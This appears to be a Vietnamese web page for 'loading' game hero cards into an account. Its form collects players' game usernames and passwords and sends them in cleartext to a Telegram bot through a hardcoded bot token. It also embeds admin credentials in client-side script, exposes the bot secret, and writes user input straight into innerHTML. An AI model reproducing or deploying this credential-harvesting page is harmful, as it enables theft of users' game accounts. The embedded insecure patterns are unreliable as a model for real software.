<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hệ Thống Up Tài Nguyên Kho LSR</title>
    <style>
        :root {
            --bg-color: #f8fafc;
            --card-bg: #ffffff;
            --text-color: #1e293b;
            --border-color: #cbd5e1;
            --primary: #2563eb;
            --primary-hover: #1d4ed8;
            --danger: #ef4444;
            --section-bg: #f1f5f9;
            --item-bg: #ffffff;
        }

        /* Dark Mode variables */
        body.dark-mode {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-color: #f8fafc;
            --border-color: #334155;
            --primary: #3b82f6;
            --primary-hover: #60a5fa;
            --section-bg: #334155;
            --item-bg: #1e293b;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            transition: background-color 0.3s, color 0.3s;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            padding: 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        header h1 {
            font-size: 1.6rem;
        }

        .header-btns {
            display: flex;
            gap: 10px;
        }

        /* Buttons */
        .btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 10px 18px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            font-size: 0.95rem;
        }

        .btn:hover { background-color: var(--primary-hover); }

        .btn-dark {
            background-color: var(--section-bg);
            color: var(--text-color);
            border: 1px solid var(--border-color);
        }

        .btn-check {
            background-color: #10b981;
        }
        .btn-check:hover { background-color: #059669; }

        .btn-danger {
            background-color: var(--danger);
        }

        /* Card Form */
        .form-card {
            background: var(--card-bg);
            padding: 24px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            margin-bottom: 24px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
        }

        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 16px;
            margin-bottom: 20px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .form-group label {
            font-size: 0.9rem;
            font-weight: 600;
        }

        .form-group input {
            padding: 10px 12px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            outline: none;
            background: var(--card-bg);
            color: var(--text-color);
        }

        /* Khung chọn thẻ LSR */
        .lsr-section {
            background: var(--section-bg);
            padding: 16px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .lsr-title {
            font-size: 1rem;
            font-weight: 700;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
        }

        .lsr-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 12px;
        }

        .lsr-item {
            display: flex;
            flex-direction: column;
            gap: 4px;
            background: var(--item-bg);
            padding: 8px 12px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }

        .lsr-item label { font-size: 0.85rem; font-weight: 600; }
        .lsr-item input {
            padding: 6px 8px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            background: var(--card-bg);
            color: var(--text-color);
            font-weight: 600;
        }

        /* Bảng Admin */
        .table-card {
            background: var(--card-bg);
            border-radius: 12px;
            border: 1px solid var(--border-color);
            overflow: hidden;
            margin-top: 20px;
        }

        .admin-toolbar {
            padding: 16px;
            background: var(--section-bg);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }

        th, td {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-color);
            font-size: 0.9rem;
        }

        th { background-color: var(--section-bg); }

        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 6px;
            font-size: 0.8rem;
            background: var(--section-bg);
            border: 1px solid var(--border-color);
            margin: 2px;
        }

        /* Modal Đăng nhập Admin */
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            z-index: 999;
        }

        .modal-content {
            background: var(--card-bg);
            padding: 24px;
            border-radius: 12px;
            width: 320px;
            border: 1px solid var(--border-color);
        }

        .modal-content h3 { margin-bottom: 16px; }
        .modal-content input { width: 100%; margin-bottom: 12px; }
    </style>
</head>
<body>

    <div class="container">
        <header>
            <h1>Nạp Tài Nguyên Kho LSR</h1>
            <div class="header-btns">
                <button class="btn btn-dark" onclick="toggleDarkMode()">🌙 Giao diện</button>
                <button class="btn" id="loginBtn" onclick="openLoginModal()">🔑 Admin</button>
            </div>
        </header>

        <!-- FORM GỬI ĐƠN (Dành cho khách/người dùng) -->
        <section class="form-card">
            <h2 style="font-size: 1.1rem; margin-bottom: 16px;">Tạo Đơn Nạp Kho</h2>
            <form id="upForm">
                <div class="form-grid">
                    <div class="form-group">
                        <label for="username">Tài Khoản / ID Game</label>
                        <input type="text" id="username" placeholder="Nhập tài khoản" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Mật Khẩu</label>
                        <input type="text" id="password" placeholder="Nhập mật khẩu" required>
                    </div>
                </div>

                <div class="lsr-section">
                    <div class="lsr-title">
                        <span>Số Lượng Thẻ LSR:</span>
                        <span id="totalBadge" style="color: var(--primary);">Tổng: 0 thẻ</span>
                    </div>
                    <div class="lsr-grid">
                        <div class="lsr-item">
                            <label for="capheny">Capheny</label>
                            <input type="number" class="lsr-input" id="capheny" min="0" value="0">
                        </div>
                        <div class="lsr-item">
                            <label for="dieuthuyen">Điêu Thuyền</label>
                            <input type="number" class="lsr-input" id="dieuthuyen" min="0" value="0">
                        </div>
                        <div class="lsr-item">
                            <label for="valhein">Valhein</label>
                            <input type="number" class="lsr-input" id="valhein" min="0" value="0">
                        </div>
                        <div class="lsr-item">
                            <label for="liliana">Liliana</label>
                            <input type="number" class="lsr-input" id="liliana" min="0" value="0">
                        </div>
                        <div class="lsr-item">
                            <label for="tulen">Tulen</label>
                            <input type="number" class="lsr-input" id="tulen" min="0" value="0">
                        </div>
                    </div>
                </div>

                <button type="submit" class="btn" style="width: 100%;">Gửi Đơn Nạp</button>
            </form>
        </section>

        <!-- BẢNG ADMIN (Chỉ hiện khi đăng nhập admin) -->
        <section class="table-card" id="adminSection" style="display: none;">
            <div class="admin-toolbar">
                <h3 style="font-size: 1rem;">Bảng Quản Lý Đơn (Admin)</h3>
                <button class="btn btn-check" onclick="sendStockReport()">📢 Check Kho Báo Tele</button>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>Mã Đơn</th>
                        <th>Tài Khoản</th>
                        <th>Mật Khẩu</th>
                        <th>Chi Tiết Thẻ</th>
                        <th>Tổng</th>
                    </tr>
                </thead>
                <tbody id="upTableBody"></tbody>
            </table>
        </section>
    </div>

    <!-- Modal Login Admin -->
    <div class="modal" id="loginModal">
        <div class="modal-content">
            <h3>Đăng Nhập Admin</h3>
            <div class="form-group">
                <input type="text" id="adminUser" placeholder="Tài khoản Admin">
                <input type="password" id="adminPass" placeholder="Mật khẩu">
            </div>
            <div style="display: flex; gap: 8px; margin-top: 10px;">
                <button class="btn" style="flex: 1;" onclick="handleLogin()">Đăng Nhập</button>
                <button class="btn btn-danger" onclick="closeLoginModal()">Hủy</button>
            </div>
        </div>
    </div>

    <script>
        // Cấu hình Telegram Bot
        const TELEGRAM_TOKEN = '8503723223:AAF8FonAHhyHUz7vKmy-7K7sBPqYJUJlCwo';
        const TELEGRAM_CHAT_ID = '8503723223';

        let upList = [];
        const lsrInputs = document.querySelectorAll('.lsr-input');
        const totalBadge = document.getElementById('totalBadge');

        // Dark Mode
        function toggleDarkMode() {
            document.body.classList.toggle('dark-mode');
        }

        // Modal Login Admin
        function openLoginModal() { document.getElementById('loginModal').style.display = 'flex'; }
        function closeLoginModal() { document.getElementById('loginModal').style.display = 'none'; }

        function handleLogin() {
            const u = document.getElementById('adminUser').value;
            const p = document.getElementById('adminPass').value;

            if (u === 'gbao08' && p === '1') {
                alert('Đăng nhập Admin thành công!');
                document.getElementById('adminSection').style.display = 'block';
                document.getElementById('loginBtn').textContent = '✅ Admin';
                closeLoginModal();
            } else {
                alert('Sai tài khoản hoặc mật khẩu Admin!');
            }
        }

        // Tính tổng số lượng
        function calculateTotal() {
            let sum = 0;
            lsrInputs.forEach(i => sum += Number(i.value) || 0);
            totalBadge.textContent = `Tổng: ${sum} thẻ`;
            return sum;
        }

        lsrInputs.forEach(i => i.addEventListener('input', calculateTotal));

        // Hàm gửi tin nhắn Telegram
        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch (err) {
                console.error('Lỗi gửi Telegram:', err);
            }
        }

        // Xử lý nạp đơn
        document.getElementById('upForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const totalQty = calculateTotal();

            if (totalQty === 0) {
                alert('Vui lòng nhập ít nhất 1 thẻ LSR!');
                return;
            }

            const cards = [
                { name: 'Capheny', qty: Number(document.getElementById('capheny').value) },
                { name: 'Điêu Thuyền', qty: Number(document.getElementById('dieuthuyen').value) },
                { name: 'Valhein', qty: Number(document.getElementById('valhein').value) },
                { name: 'Liliana', qty: Number(document.getElementById('liliana').value) },
                { name: 'Tulen', qty: Number(document.getElementById('tulen').value) }
            ];

            const activeCards = cards.filter(c => c.qty > 0);
            
            // Nội dung hiển thị bảng Admin
            const detailsHtml = activeCards.map(c => `<span class="badge">${c.name}: ${c.qty}</span>`).join(' ');

            // Thêm đơn vào danh sách nội bộ
            const newOrder = {
                id: 'UP-' + Math.floor(100 + Math.random() * 900),
                user: user,
                pass: pass,
                totalQty: totalQty,
                details: detailsHtml,
                cards: activeCards
            };
            upList.unshift(newOrder);
            renderTable();

            // Soạn tin nhắn gửi về Telegram
            let cardDetailsText = activeCards.map(c => `• ${c.name}: ${c.qty}`).join('\n');
            let msg = `📥 <b>ĐƠN NẠP KHO MỚI!</b>\n\n` +
                      `👤 <b>Tài khoản:</b> <code>${user}</code>\n` +
                      `🔑 <b>Mật khẩu:</b> <code>${pass}</code>\n` +
                      `📊 <b>Chi tiết thẻ LSR:</b>\n${cardDetailsText}\n` +
                      `👉 <b>TỔNG SỐ LƯỢNG:</b> <b>${totalQty} thẻ</b>`;

            await sendTelegramMessage(msg);
            alert('Gửi đơn thành công! Đã báo về Telegram.');

            // Reset form
            this.reset();
            calculateTotal();
        });

        // Báo cáo Kho nhanh về Telegram (Nút Check Kho)
        async function sendStockReport() {
            if (upList.length === 0) {
                alert('Chưa có đơn nào trong kho!');
                return;
            }

            let totals = { Capheny: 0, 'Điêu Thuyền': 0, Valhein: 0, Liliana: 0, Tulen: 0 };
            let grandTotal = 0;

            upList.forEach(order => {
                order.cards.forEach(c => {
                    if (totals[c.name] !== undefined) {
                        totals[c.name] += c.qty;
                        grandTotal += c.qty;
                    }
                });
            });

            let stockText = `Capheny: ${totals['Capheny']}\n` +
                            `Điêu Thuyền: ${totals['Điêu Thuyền']}\n` +
                            `Valhein: ${totals['Valhein']}\n` +
                            `Liliana: ${totals['Liliana']}\n` +
                            `Tulen: ${totals['Tulen']}`;

            let msg = `📊 <b>BÁO CÁO TỔNG KHO HIỆN TẠI</b>\n\n` +
                      `${stockText}\n\n` +
                      `🔥 <b>TỔNG THẺ LSR KHO:</b> <b>${grandTotal} thẻ</b>\n` +
                      `📦 <b>Tổng đơn đã tạo:</b> ${upList.length} đơn`;

            await sendTelegramMessage(msg);
            alert('Đã gửi báo cáo tổng kho về Telegram!');
        }

        // Render Bảng Admin
        function renderTable() {
            const tableBody = document.getElementById('upTableBody');
            tableBody.innerHTML = '';

            upList.forEach(item => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td><b>${item.id}</b></td>
                    <td>${item.user}</td>
                    <td><code>${item.pass}</code></td>
                    <td>${item.details}</td>
                    <td><b>${item.totalQty}</b> thẻ</td>
                `;
                tableBody.appendChild(row);
            });
        }
    </script>
</body>
</html>
